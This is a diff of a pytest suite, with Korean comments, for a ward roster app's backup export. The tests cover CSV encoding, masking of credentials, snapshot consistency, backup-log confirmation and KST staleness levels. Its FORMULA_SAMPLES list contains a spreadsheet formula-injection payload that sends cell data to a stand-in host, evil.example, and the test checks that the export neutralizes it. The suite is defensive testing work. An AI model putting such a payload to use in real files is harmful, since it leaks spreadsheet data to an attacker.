+
+def test_every_csv_starts_with_bom_and_keeps_korean(client, owner_ok):
+    """CSV 첫 3바이트가 UTF-8 BOM이고 한글 값이 깨지지 않는다."""
+    _feedback(client, owner_ok, "한글 피드백 원문 — 백업에 실린다")
+    zf = _zip_of(_download(client, owner_ok)[0])
+    for table in EXPECTED_CSV_TABLES:
+        raw = zf.read(f"tables/{table}.csv")
+        assert raw[:3] == BOM, f"{table}.csv BOM 없음: {raw[:6]!r}"
+    users = _csv_rows(zf, "users")
+    assert any(u["name"] == OWNER.name for u in users), \
+        f"한글 이름이 CSV에 온전히 실리지 않음: {[u['name'] for u in users]}"
+    fb = _csv_rows(zf, "feedback")
+    assert any("한글 피드백 원문" in f["message"] for f in fb), fb
 
 
-def test_ac3_readme_is_korean_with_kst_time_and_privacy_warning(client, people, monkeypatch):
-    """README.txt: 한국어 + 백업 시각(KST) + 개인정보/공유 금지 안내.
+def test_readme_is_korean_with_kst_time_and_row_counts(client, owner_ok):
+    """README: 한국어 안내 + KST 백업 시각 + **주요 테이블 행수** + 개인정보 경고."""
+    zf = _zip_of(_download(client, owner_ok)[0])
+    raw = zf.read("README.txt")
+    assert raw[:3] == BOM, f"README에 BOM이 없다(구형 메모장 한글 깨짐): {raw[:6]!r}"
+    text = raw.decode("utf-8-sig")
+    assert "\r\n" in text and "\n" not in text.replace("\r\n", ""), \
+        "README 줄바꿈이 CRLF가 아니다(구형 메모장에서 한 줄로 붙는다)"
+    now_kst = datetime.now(KST)
+    assert f"{now_kst:%Y년 %m월}" in text, f"KST 백업 시각이 없음:\n{text[:400]}"
+    for keyword in ("복구", "개인정보"):
+        assert keyword in text, f"README에 '{keyword}' 안내가 없음"
+    assert ("공유" in text) or ("전달하지" in text), \
+        f"README에 '공유 금지' 취지의 문구가 없음:\n{text[-600:]}"
+    # 행수: 실제 users 행수가 README에 적혀 있어야 한다.
+    conn = _db()
+    try:
+        n_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+    finally:
+        conn.close()
+    m = re.search(r"users\s*:\s*([\d,]+)건", text)
+    assert m, f"README에 users 행수가 없음:\n{text[:800]}"
+    assert int(m.group(1).replace(",", "")) == n_users, \
+        f"README 행수({m.group(1)})가 실제({n_users})와 다름"
 
-    표기 형식은 규정하지 않는다(지시서는 "백업 시각(KST)"만 요구). 대신 적힌 시각이
-    **UTC가 아니라 KST**인지를 실제 값으로 확인한다.
+
+def test_row_counts_reflect_real_data(client, owner_ok):
+    """행수가 고정 문구가 아니라 **실제 데이터**를 따라간다."""
+    zf1 = _zip_of(_download(client, owner_ok)[0])
+    before = re.search(r"feedback\s*:\s*([\d,]+)건", zf1.read("README.txt").decode("utf-8-sig"))
+    assert before, "README에 feedback 행수가 없음"
+    for i in range(3):
+        _feedback(client, owner_ok, f"행수 확인용 {i}")
+    zf2 = _zip_of(_download(client, owner_ok)[0])
+    after = re.search(r"feedback\s*:\s*([\d,]+)건", zf2.read("README.txt").decode("utf-8-sig"))
+    assert int(after.group(1)) == int(before.group(1)) + 3, \
+        f"행수가 실제를 따라가지 않음: {before.group(1)} → {after.group(1)}"
+
+
+# ==================== 데이터 보호 — 마스킹 / 절단 / 수식 ====================
+
+def test_csv_masks_declared_credentials(client, owner_ok):
+    """`users.pw_hash`·`users.salt`·`ward_invites.code` 는 CSV에서 값이 지워진다."""
+    zf = _zip_of(_download(client, owner_ok)[0])
+    conn = _db()
+    try:
+        real = {
+            ("users", "pw_hash"): [r[0] for r in conn.execute("SELECT pw_hash FROM users")],
+            ("users", "salt"): [r[0] for r in conn.execute("SELECT salt FROM users")],
+            ("ward_invites", "code"): [r[0] for r in conn.execute("SELECT code FROM ward_invites")],
+        }
+    finally:
+        conn.close()
+    blob = b"".join(zf.read(n) for n in zf.namelist() if n.startswith("tables/"))
+    for (table, col), values in real.items():
+        rows = _csv_rows(zf, table)
+        assert rows, f"{table}.csv 가 비어 있음"
+        for row in rows:
+            assert row[col] == "(생략)", f"{table}.{col} 가 마스킹되지 않음: {row[col]!r}"
+        for v in values:
+            assert v, "테스트 자기검증 실패: 원본 값이 비어 있음"
+            assert v.encode() not in blob, f"{table}.{col} 값이 CSV 어딘가에 남아 있음"
+
+
+def test_csv_masks_newly_added_credential_columns(client, owner_ok):
+    """**fail-closed**: 명시 목록에 없는 새 자격증명 컬럼도 이름으로 걸러 가린다.
+
+    검수부가 `users`에 `reset_token`을 추가했더니 평문으로 실려 나간 결함의 회귀 테스트.
     """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
-    text = zf.read("README.txt").decode("utf-8-sig")
-    assert any("가" <= ch <= "힣" for ch in text), f"README.txt가 한국어가 아님: {text[:200]}"
+    marker = {}
+    conn = _db()
+    try:
+        for col in NEW_SECRET_COLUMNS:
+            value = "QA-LEAK-" + secrets.token_hex(8)
+            marker[col] = value
+            conn.execute(f"ALTER TABLE users ADD COLUMN {col} TEXT")
+            conn.execute(f"UPDATE users SET {col}=?", (value,))
+        conn.commit()
+    finally:
+        conn.close()
 
-    m = re.search(r"(\d{4})\D{1,3}(\d{1,2})\D{1,3}(\d{1,2})\D{1,4}(\d{1,2}):(\d{2})", text)
-    assert m, f"README.txt에서 백업 시각을 찾지 못함: {text[:400]}"
-    stamped = datetime(*(int(g) for g in m.groups()), tzinfo=KST)
-    now_kst = datetime.now(timezone.utc).astimezone(KST)
-    assert abs((now_kst - stamped).total_seconds()) < 300, (
-        f"백업 시각이 KST가 아님(UTC로 적힌 듯): README={stamped.isoformat()}, "
-        f"현재 KST={now_kst.isoformat()}")
-
-    assert ("KST" in text) or ("한국" in text), "README.txt에 시간대(KST/한국 시간) 표기가 없음"
-    assert "개인정보" in text, "README.txt에 개인정보 포함 경고가 없음"
-    assert "복구" in text, "README.txt에 복구 요청 방법 안내가 없음"
+    zf = _zip_of(_download(client, owner_ok)[0])
+    blob = b"".join(zf.read(n) for n in zf.namelist() if n.startswith("tables/"))
+    rows = _csv_rows(zf, "users")
+    for col, value in marker.items():
+        assert col in rows[0], f"새 컬럼 {col}이 CSV에 아예 없음(스키마 반영 실패): {list(rows[0])}"
+        for row in rows:
+            assert row[col] == "(생략)", f"{col}이 평문으로 나감: {row[col]!r}"
+        assert value.encode() not in blob, f"{col} 값이 CSV에 남아 있음"
 
 
-def test_ac3_no_temp_files_left_after_success(client, people, monkeypatch, env):
-    """성공 경로: 요청 종료 후 서버에 백업 임시 파일 잔존 0(개인정보 잔여 금지)."""
-    _allow_uid(monkeypatch, _uid(people.owner))
+def test_master_db_keeps_real_values_for_recovery(client, owner_ok, tmp_path):
+    """정본 `duty.db`에는 가려진 값이 **그대로** 있어야 한다(복구 능력 유지)."""
+    conn = _db()
+    try:
+        expect_pw = {r[0] for r in conn.execute("SELECT pw_hash FROM users")}
+        expect_code = {r[0] for r in conn.execute("SELECT code FROM ward_invites")}
+        expect_data = {r[0] for r in conn.execute("SELECT data FROM rosters")}
+    finally:
+        conn.close()
+    zf = _zip_of(_download(client, owner_ok)[0])
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
+    try:
+        assert {r[0] for r in conn.execute("SELECT pw_hash FROM users")} == expect_pw
+        assert {r[0] for r in conn.execute("SELECT code FROM ward_invites")} == expect_code
+        assert {r[0] for r in conn.execute("SELECT data FROM rosters")} == expect_data
+        assert "(생략)" not in "".join(
+            str(r[0]) for r in conn.execute("SELECT pw_hash FROM users"))
+    finally:
+        conn.close()
+
+
+def test_json_columns_are_replaced_in_csv_only(client, owner_ok, tmp_path):
+    """`rosters.data`·`schedules.data` 는 CSV에서 안내 문구로 대체, duty.db는 무손상."""
+    payload = json.dumps({"nurses": [{"name": "가명간호사", "team": 1}]}, ensure_ascii=False)
+    conn = _db()
+    try:
+        conn.execute("INSERT OR REPLACE INTO rosters (ward, data, updated_at, updated_by) "
+                     "VALUES (?,?,?,?)", ("61", payload, _kst_days_ago(0).isoformat(), "uid:1"))
+        conn.execute("INSERT OR REPLACE INTO schedules (ward, year, month, data, updated_at,"
+                     " updated_by) VALUES (?,?,?,?,?,?)",
+                     ("61", 2026, 8, payload, _kst_days_ago(0).isoformat(), "uid:1"))
+        conn.commit()
+    finally:
+        conn.close()
+
+    zf = _zip_of(_download(client, owner_ok)[0])
+    for table in ("rosters", "schedules"):
+        rows = _csv_rows(zf, table)
+        assert rows, f"{table}.csv 가 비어 있음"
+        for row in rows:
+            assert row["data"] == "(JSON — duty.db 참조)", \
+                f"{table}.data 가 대체되지 않음: {row['data'][:80]!r}"
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
+    try:
+        assert conn.execute("SELECT data FROM rosters WHERE ward='61'").fetchone()[0] == payload
+        assert conn.execute("SELECT data FROM schedules WHERE ward='61'").fetchone()[0] == payload
+    finally:
+        conn.close()
+
+
+def test_oversized_cell_is_truncated_in_csv_only(client, owner_ok, tmp_path):
+    """길이 상한을 넘는 셀은 CSV에서 잘린다 — 정본은 온전하다."""
+    from app.backup import MAX_CELL_CHARS
+
+    long_text = "가" * (MAX_CELL_CHARS + 5000)
+    conn = _db()
+    try:
+        conn.execute("INSERT INTO feedback (ward, from_email, from_name, message, created_at)"
+                     " VALUES (?,?,?,?,?)",
+                     ("61", STAFF.email, "가명제보자", long_text,
+                      datetime.now(timezone.utc).isoformat()))
+        conn.commit()
+    finally:
+        conn.close()
+
+    zf = _zip_of(_download(client, owner_ok)[0])
+    cells = [row["message"] for row in _csv_rows(zf, "feedback")]
+    big = [c for c in cells if c.startswith("가")]
+    assert big, f"긴 피드백이 CSV에 없음: {[c[:20] for c in cells]}"
+    cell = big[0]
+    assert len(cell) < len(long_text), "상한을 넘는 셀이 그대로 실렸다"
+    assert "생략" in cell, f"절단 표시가 없음: ...{cell[-40:]!r}"
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
+    try:
+        stored = conn.execute(
+            "SELECT message FROM feedback WHERE message LIKE '가%'").fetchone()[0]
+    finally:
+        conn.close()
+    assert stored == long_text, "정본 duty.db의 값이 잘렸다(복구 손실)"
+
+
+FORMULA_SAMPLES = [
+    "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"급여명세\")",
+    "+1+1",
+    "-2+3",
+    "@SUM(A1:A9)",
+    "\tTAB으로 시작",
+    "\r캐리지리턴으로 시작",
+]
+
+
+def test_csv_formula_injection_is_neutralized(client, owner_ok, tmp_path):
+    """수식으로 해석될 수 있는 값 앞에 `'`를 붙인다 — 정본은 무변경."""
+    conn = _db()
+    try:
+        conn.executemany(
+            "INSERT INTO feedback (ward, from_email, from_name, message, created_at)"
+            " VALUES (?,?,?,?,?)",
+            [("61", STAFF.email, "가명제보자", s, datetime.now(timezone.utc).isoformat())
+             for s in FORMULA_SAMPLES])
+        conn.commit()
+    finally:
+        conn.close()
+
+    zf = _zip_of(_download(client, owner_ok)[0])
+    # CSV 원문에서 직접 확인한다 — 파서를 거치면 따옴표·CR 처리가 섞여 판정이 흐려진다.
+    text = zf.read("tables/feedback.csv").decode("utf-8-sig")
+    for sample in FORMULA_SAMPLES:
+        escaped = ("'" + sample).replace('"', '""')  # csv가 큰따옴표를 두 번 쓴다
+        assert escaped in text, (
+            f"수식 인젝션이 차단되지 않았다: {sample!r} — 앞에 작은따옴표가 없다")
+        assert ('\n' + sample.replace('"', '""')) not in text, \
+            f"원문 그대로 실린 셀이 있다: {sample!r}"
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
+    try:
+        stored = {r[0] for r in conn.execute("SELECT message FROM feedback")}
+    finally:
+        conn.close()
+    for sample in FORMULA_SAMPLES:
+        assert sample in stored, f"정본의 값이 바뀌었다: {sample!r}"
+
+
+def test_feedback_written_through_the_app_is_also_neutralized(client, owner_ok):
+    """부서원이 화면으로 쓴 피드백(=HYPERLINK...)도 같은 규칙으로 막힌다."""
+    _feedback(client, owner_ok, FORMULA_SAMPLES[0])
+    zf = _zip_of(_download(client, owner_ok)[0])
+    text = zf.read("tables/feedback.csv").decode("utf-8-sig")
+    escaped = ("'" + FORMULA_SAMPLES[0]).replace('"', '""')
+    assert escaped in text, f"화면으로 쓴 수식이 그대로 실렸다:\n{text[:400]}"
+
+
+# ==================== 수용 기준 2 — 일관성 (스냅샷) ====================
+
+def test_row_committed_just_before_backup_is_in_db_and_csv(client, owner_ok, tmp_path):
+    """백업 직전 커밋된 행이 ZIP의 duty.db와 CSV **양쪽**에 있다."""
+    marker = "직전커밋-" + secrets.token_hex(6)
+    _feedback(client, owner_ok, marker)
+    zf = _zip_of(_download(client, owner_ok)[0])
+    assert any(marker in row["message"] for row in _csv_rows(zf, "feedback")), \
+        "직전 커밋 행이 CSV에 없음"
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
+    try:
+        n = conn.execute("SELECT COUNT(*) FROM feedback WHERE message=?", (marker,)).fetchone()[0]
+    finally:
+        conn.close()
+    assert n == 1, "직전 커밋 행이 duty.db 사본에 없음"
+
+
+def test_original_db_stays_usable_during_and_after_backup(client, owner_ok, monkeypatch):
+    """백업 중·후에도 원본 DB 읽기·쓰기가 계속 성공한다."""
+    import app.backup as backup
+
+    real_snapshot = backup._snapshot
+    during = {}
+
+    def _snapshot_with_traffic(dest_path):
+        try:
+            r = client.post("/api/feedback", json={"message": "백업 중 쓰기"},
+                            headers=_h(owner_ok["token"]))
+            during["write"] = r.status_code
+            during["read"] = client.get("/api/roster", headers=_h(owner_ok["token"])).status_code
+        except Exception as exc:  # noqa: BLE001
+            during["exc"] = repr(exc)
+        return real_snapshot(dest_path)
+
+    monkeypatch.setattr(backup, "_snapshot", _snapshot_with_traffic)
+    r, _ = _download(client, owner_ok)
+    assert r.status_code == 200
+    assert during.get("write") == 200, f"백업 중 쓰기 실패: {during}"
+    assert during.get("read") == 200, f"백업 중 읽기 실패: {during}"
+    after = client.post("/api/feedback", json={"message": "백업 후 쓰기"},
+                        headers=_h(owner_ok["token"]))
+    assert after.status_code == 200, f"백업 후 쓰기 실패: {after.status_code}"
+
+
+def test_no_temp_files_left_after_success(client, owner_ok, env):
+    """성공 경로: 요청이 끝나면 임시 백업 파일이 하나도 남지 않는다."""
     before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
-
-    for _ in range(3):  # 반복해도 쌓이지 않아야 한다
-        assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
-
+    _full_backup(client, owner_ok)
     _assert_no_leftovers(env, before_tmp, before_db, where="(성공 경로)")
 
 
-# ============ 보완 지시 필수 2 — 백업 산출물에서 자격증명 제거 ============
-
-def test_ac_mask_no_credentials_anywhere_in_csv(client, people, monkeypatch):
-    """ZIP **안 어느 CSV에도** 실제 초대 코드·비밀번호 해시·salt가 없어야 한다.
-
-    검수부 ②는 ward_invites.csv의 유효한 초대 코드로 실제 가입에 성공했다.
-    복구 정본은 duty.db이므로 CSV의 이 값들은 이득 0, 위험만 있다.
-    """
-    _allow_uid(monkeypatch, _uid(people.owner))
-
-    conn = _db()
-    try:
-        secrets = set()
-        for table, column in CREDENTIAL_COLUMNS:
-            for row in conn.execute(f"SELECT {column} FROM {table}"):
-                if row[0]:
-                    secrets.add(str(row[0]))
-    finally:
-        conn.close()
-    assert secrets, "테스트 자기검증 실패: 원본 DB에 자격증명 값이 하나도 없음"
-    assert len(secrets) >= 4, f"검사 대상 자격증명이 너무 적음: {len(secrets)}건"
-
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
-    for name in zf.namelist():
-        if not name.endswith(".csv"):
-            continue
-        text = zf.read(name).decode("utf-8-sig")
-        for s in secrets:
-            assert s not in text, f"{name} 에 자격증명 평문 노출: {s[:6]}…"
-
-    # 마스킹 대상 컬럼은 '값이 지워졌다'는 것이 눈에 보여야 한다(빈칸이면 복구 오해).
-    users_rows = list(csv.DictReader(io.StringIO(
-        zf.read("tables/users.csv").decode("utf-8-sig"))))
-    assert users_rows, "users.csv에 행이 없음"
-    for row in users_rows:
-        for column in ("pw_hash", "salt"):
-            assert row[column] == "(생략)", f"users.{column} 마스킹 값이 다름: {row[column]!r}"
-    invite_rows = list(csv.DictReader(io.StringIO(
-        zf.read("tables/ward_invites.csv").decode("utf-8-sig"))))
-    assert invite_rows, "ward_invites.csv에 행이 없음"
-    for row in invite_rows:
-        assert row["code"] == "(생략)", f"ward_invites.code 마스킹 값이 다름: {row['code']!r}"
-
-
-def test_ac_mask_master_db_keeps_original_values(client, people, monkeypatch, tmp_path):
-    """마스킹은 CSV에만 — 복구 정본 duty.db에는 원값이 그대로 보존된다.
-
-    여기가 지워지면 백업으로 복구해도 아무도 로그인할 수 없다.
-    """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    conn = _db()
-    try:
-        original_users = {r["id"]: (r["pw_hash"], r["salt"])
-                          for r in conn.execute("SELECT id, pw_hash, salt FROM users")}
-        original_invites = {r["ward"]: r["code"]
-                            for r in conn.execute("SELECT ward, code FROM ward_invites")}
-    finally:
-        conn.close()
-    assert original_users and original_invites, "테스트 자기검증 실패: 원본이 비었음"
-
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
-    restored = sqlite3.connect(_extract_db(zf, tmp_path))
-    restored.row_factory = sqlite3.Row
-    try:
-        got_users = {r["id"]: (r["pw_hash"], r["salt"])
-                     for r in restored.execute("SELECT id, pw_hash, salt FROM users")}
-        got_invites = {r["ward"]: r["code"]
-                       for r in restored.execute("SELECT ward, code FROM ward_invites")}
-    finally:
-        restored.close()
-
-    assert got_users == original_users, "duty.db 정본의 pw_hash/salt가 훼손됨(복구 불가)"
-    assert got_invites == original_invites, "duty.db 정본의 초대 코드가 훼손됨"
-    assert "(생략)" not in {v for pair in got_users.values() for v in pair}, \
-        "정본 duty.db에 마스킹 값이 들어감"
-
-
-# ============================ 수용 기준 4 — 이력(2단계 pending → confirm) ============================
-
-def test_ac4_get_creates_pending_row_and_returns_backup_id(client, people, monkeypatch):
-    """GET /backup 은 **아직 성공이 아니다** — pending 행 + X-Backup-Id.
-
-    (재설계 근거: 보완 지시 필수 3 — 응답 전에 'ok'를 남기면 다운로드가 끊겨도
-    시스템은 백업이 있다고 믿는다.)
-    """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    assert _log_rows() == [], "백업 전인데 이력이 있음"
-
-    r, bid = _download(client, people.owner)
-    rows = _log_rows()
-    assert len(rows) == 1, f"GET 1회에 이력 {len(rows)}행: {rows}"
-    row = rows[0]
-    assert row["id"] == bid, f"X-Backup-Id({bid})가 이력 행 번호({row['id']})와 다름"
-    assert row["status"] == "pending", f"확정 전인데 status={row['status']!r} (기대 pending)"
-    # 크기 불일치 검사(아래 테스트)가 성립하려면 서버가 만든 크기가 기록돼 있어야 한다.
-    assert row["byte_size"] == len(r.content), \
-        f"기록된 크기가 실제 전달 크기와 다름: {row['byte_size']} != {len(r.content)}"
-    parsed = datetime.fromisoformat(str(row["created_at"]))
-    assert parsed.tzinfo is not None, f"created_at에 시간대가 없음: {row['created_at']}"
-    assert parsed.utcoffset() == timedelta(0), \
-        f"created_at이 UTC 저장이 아님(교훈 L-4): {row['created_at']}"
-
-
-def test_ac4_confirm_marks_ok_and_counts_one_row_per_backup(client, people, monkeypatch):
-    """확정(confirm)해야 status='ok'. 성공 1회당 행 1개, 2회면 2개."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    r1, bid1 = _download(client, people.owner)
-    assert _confirm(client, people.owner, bid1, len(r1.content)).status_code == 200
-
-    rows = _log_rows()
-    assert len(rows) == 1, f"성공 1회에 이력 {len(rows)}행: {rows}"
-    assert rows[0]["status"] == "ok", f"확정했는데 status={rows[0]['status']!r}"
-    assert rows[0]["byte_size"] > 0, f"byte_size가 0 이하: {rows[0]}"
-
-    r2, bid2 = _download(client, people.owner)
-    assert bid2 != bid1, "두 번째 요청이 같은 이력 행을 재사용함"
-    assert _confirm(client, people.owner, bid2, len(r2.content)).status_code == 200
-    rows = _log_rows()
-    assert len(rows) == 2, f"성공 2회인데 이력이 {len(rows)}행"
-    assert [x["status"] for x in rows] == ["ok", "ok"], rows
-
-
-def test_ac4_confirm_size_mismatch_is_400_and_stays_pending(client, people, monkeypatch):
-    """크기 불일치 → 400, 행은 pending 유지(부분 전달을 성공으로 세지 않는다)."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    r, bid = _download(client, people.owner)
-    size = len(r.content)
-
-    for wrong in (size - 1, size + 1, 0):
-        bad = _confirm(client, people.owner, bid, wrong)
-        assert bad.status_code == 400, f"크기 {wrong}(실제 {size})인데 {bad.status_code}"
-        rows = _log_rows()
-        assert len(rows) == 1 and rows[0]["status"] == "pending", \
-            f"크기 불일치 후 상태가 오염됨: {rows}"
-
-    # 올바른 크기로는 확정된다(대조군).
-    assert _confirm(client, people.owner, bid, size).status_code == 200
-    assert _log_rows()[0]["status"] == "ok"
-
-
-def test_ac4_confirm_of_other_users_row_is_404(client, people, monkeypatch):
-    """남의 pending 행을 confirm하면 404 — 남의 백업을 대신 '성공'시킬 수 없다."""
-    owner_uid, other_uid = _uid(people.owner), _uid(people.other)
-    _allow_uid(monkeypatch, owner_uid, other_uid)
-
-    r_owner, bid_owner = _download(client, people.owner)
-    r_other, bid_other = _download(client, people.other)
-    assert bid_owner != bid_other
-
-    stolen = _confirm(client, people.other, bid_owner, len(r_owner.content))
-    assert stolen.status_code == 404, f"남의 행 confirm이 {stolen.status_code}"
-    by_id = {row["id"]: row for row in _log_rows()}
-    assert by_id[bid_owner]["status"] == "pending", "남이 확정해 버림"
-
-    # 존재하지 않는 행도 404
-    missing = _confirm(client, people.owner, 999999, 1)
-    assert missing.status_code == 404, f"없는 행 confirm이 {missing.status_code}"
-
-    # 본인 행은 정상 확정(대조군)
-    assert _confirm(client, people.other, bid_other, len(r_other.content)).status_code == 200
-    assert _confirm(client, people.owner, bid_owner, len(r_owner.content)).status_code == 200
-
-
-def test_ac4_confirm_is_idempotent(client, people, monkeypatch):
-    """같은 confirm을 다시 불러도 멱등 — 행이 늘거나 상태가 뒤집히지 않는다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    r, bid = _download(client, people.owner)
-    size = len(r.content)
-
-    first = _confirm(client, people.owner, bid, size)
-    assert first.status_code == 200, first.text
-    second = _confirm(client, people.owner, bid, size)
-    assert second.status_code == 200, f"재확정이 {second.status_code}: {second.text[:200]}"
-
-    rows = _log_rows()
-    assert len(rows) == 1, f"멱등이어야 하는데 행이 늘어남: {rows}"
-    assert rows[0]["status"] == "ok", rows
-    assert first.json() == second.json() or (
-        first.json()["level"] == second.json()["level"]), "재확정 응답이 달라짐"
-
-
-def test_ac4_denied_export_attempts_leave_denied_rows(client, people, monkeypatch):
-    """반출 거부(GET /backup, POST /confirm)는 `status='denied'` 행을 남긴다.
-
-    (재설계 근거: 보완 지시 필수 4-2 — 침입 시도를 탐지할 수단이 필요하다.
-    옛 기준 "403은 행 미추가"는 폐기됐다.)
-    """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    assert _log_rows() == []
-
-    for who in (people.admin, people.staff, people.other):
-        assert client.get(BACKUP_URL, headers=_h(who["token"])).status_code == 403
-    assert client.post(CONFIRM_URL, json={"id": 1, "bytes": 1},
-                       headers=_h(people.staff["token"])).status_code == 403
-
-    rows = _log_rows()
-    assert len(rows) == 4, f"거부 4회인데 이력 {len(rows)}행: {rows}"
-    assert {r["status"] for r in rows} == {"denied"}, rows
-
-    # 인증조차 없는 요청은 남길 uid가 없으므로 행을 만들지 않는다.
-    assert client.get(BACKUP_URL).status_code == 401
-    assert len(_log_rows()) == 4, "무인증 401이 이력을 남김"
-
-
-def test_ac4_denied_status_check_leaves_no_log_row(client, people, monkeypatch):
-    """`GET /backup/status` 의 거부는 기록하지 않는다.
-
-    모든 로그인 사용자가 화면 구성용으로 호출하므로, 여기까지 기록하면
-    이력이 오염돼 진짜 침입 시도를 찾을 수 없다.
-    """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    for _ in range(3):
-        for who in (people.admin, people.staff, people.other):
-            assert client.get(STATUS_URL, headers=_h(who["token"])).status_code == 403
-    assert _log_rows() == [], f"status 거부가 이력을 남김: {_log_rows()}"
-
-
-def test_ac4_actor_is_uid_form_and_carries_no_personal_info(client, people, monkeypatch):
-    """모든 이력 행의 actor는 `uid:<번호>` — 사번·이메일·실명이 들어가면 안 된다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _full_backup(client, people.owner)
-    assert client.get(BACKUP_URL, headers=_h(people.staff["token"])).status_code == 403
-
-    rows = _log_rows()
-    assert len(rows) == 2, rows
-    pii = ([p.name for p in (OWNER, ADMIN, STAFF, OTHER)]
-           + [p.empno for p in (OWNER, ADMIN, STAFF, OTHER)]
-           + [p.email for p in (OWNER, ADMIN, STAFF, OTHER)])
-    for row in rows:
-        actor = str(row["actor"])
-        assert re.fullmatch(r"uid:\d+", actor), f"actor 형식이 uid:<번호>가 아님: {actor!r}"
-        blob = " ".join(str(v) for v in row.values())
-        for s in pii:
-            assert s not in blob, f"이력 행에 신원 정보({s!r}) 노출: {row}"
-    assert rows[0]["actor"] == f"uid:{_uid(people.owner)}"
-    assert rows[1]["actor"] == f"uid:{_uid(people.staff)}", "거부 행의 actor가 시도자 uid가 아님"
-
-
-# ============================ 수용 기준 5 — 상태 계산(KST) ============================
-
-def test_ac5_no_history_is_critical(client, people, monkeypatch):
-    """이력 0건 → critical."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _set_last_backup(None)
-    body = _status(client, people.owner)
-    assert body["level"] == "critical", f"이력 0건인데 {body}"
-    assert body["last_backup_at"] in (None, ""), f"이력 0건인데 시각이 있음: {body}"
-
-
-@pytest.mark.parametrize(("days", "level"), [
-    (0, "ok"), (1, "ok"), (29, "ok"),
-    (30, "warn"), (31, "warn"), (44, "warn"),
-    (45, "critical"), (60, "critical"),
-])
-def test_ac5_level_thresholds_by_kst_elapsed_days(client, people, monkeypatch, days, level):
-    """KST 경과 29일→ok / 30일→warn / 45일→critical."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _set_last_backup(_kst_days_ago(days))
-    body = _status(client, people.owner)
-    assert body["days_since"] == days, f"경과일 계산 오류: {body} (기대 {days}일)"
-    assert body["level"] == level, f"{days}일인데 level={body['level']} (기대 {level})"
-
-
-@pytest.mark.parametrize(("days", "level"), [(29, "ok"), (30, "warn"), (45, "critical")])
-def test_ac5_boundary_uses_kst_not_utc(client, people, monkeypatch, days, level):
-    """UTC 달력으로 세면 다른 값이 나오는 경계 시각에서도 KST 결과가 나온다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    at = _kst_days_ago(days, flip_utc_date=True)
-    utc_days = _utc_date_diff(at)
-    assert utc_days != days, (
-        "테스트 자기검증 실패: UTC/KST가 갈리는 시각을 못 만듦 "
-        f"(KST {days}일, UTC {utc_days}일, 대상 {at.isoformat()})")
-
-    _set_last_backup(at)
-    body = _status(client, people.owner)
-    assert body["days_since"] == days, (
-        f"KST가 아니라 UTC로 계산됨: 응답 {body['days_since']}일, "
-        f"KST {days}일 / UTC {utc_days}일 (대상 {at.isoformat()})")
-    assert body["level"] == level, f"{body} (KST {days}일 → 기대 {level})"
-
-
-def test_ac5_status_is_ok_only_after_confirm(client, people, monkeypatch):
-    """내려받다 끊긴 백업(pending)은 세지 않는다 — 경고가 계속 떠야 한다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _set_last_backup(_kst_days_ago(60))
-    assert _status(client, people.owner)["level"] == "critical"
-
-    # 1) 내려받기만 하고 확정하지 않음 = 파일이 도착했다는 증거가 없다.
-    r, bid = _download(client, people.owner)
-    body = _status(client, people.owner)
-    assert body["days_since"] == 60, f"pending을 성공으로 셈: {body}"
-    assert body["level"] == "critical", f"pending인데 경고가 꺼짐: {body}"
-
-    # 2) 확정하면 그때 경고가 사라진다.
-    assert _confirm(client, people.owner, bid, len(r.content)).status_code == 200
-    body = _status(client, people.owner)
-    assert body["days_since"] == 0, f"확정 직후인데 {body}"
-    assert body["level"] == "ok", f"확정 직후인데 {body}"
-    assert body["last_backup_at"], "확정 직후인데 last_backup_at이 비어 있음"
-
-
-@pytest.mark.parametrize("status", ["pending", "fail", "denied"])
-def test_ac5_level_counts_ok_rows_only(client, people, monkeypatch, status):
-    """`ok`가 아닌 행(pending·fail·denied)은 '마지막 백업'으로 세지 않는다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _set_last_backup(_kst_days_ago(60))          # 마지막 진짜 성공은 60일 전
-    _insert_log_row(_kst_days_ago(0), status=status, uid=_uid(people.owner))
-
-    body = _status(client, people.owner)
-    assert body["days_since"] == 60, f"{status} 행을 성공으로 셈: {body}"
-    assert body["level"] == "critical", f"{status} 행 때문에 경고가 꺼짐: {body}"
-
-
-@pytest.mark.parametrize("days", [-1, -30, -3650])
-def test_ac5_level_for_negative_days_is_critical(days):
-    """시계 되돌림 등으로 경과일이 음수가 되면 경고를 끄지 말고 critical.
-
-    '미래에 백업했다'는 값은 신뢰할 수 없다 — 조용히 ok가 되면 백업이 없는데도
-    경고가 사라진다.
-    """
-    from app.backup import level_for
-
-    assert level_for(days) == "critical", f"level_for({days}) = {level_for(days)!r}"
-
-
-def test_ac5_level_for_boundaries_and_unknown():
-    """level_for 단위 경계 — 29/30/44/45, 이력 없음(None)."""
-    from app.backup import level_for
-
-    assert level_for(None) == "critical", "이력 없음(None)은 critical"
-    assert level_for(0) == "ok"
-    assert level_for(29) == "ok"
-    assert level_for(30) == "warn"
-    assert level_for(44) == "warn"
-    assert level_for(45) == "critical"
-    assert level_for(10000) == "critical"
-
-
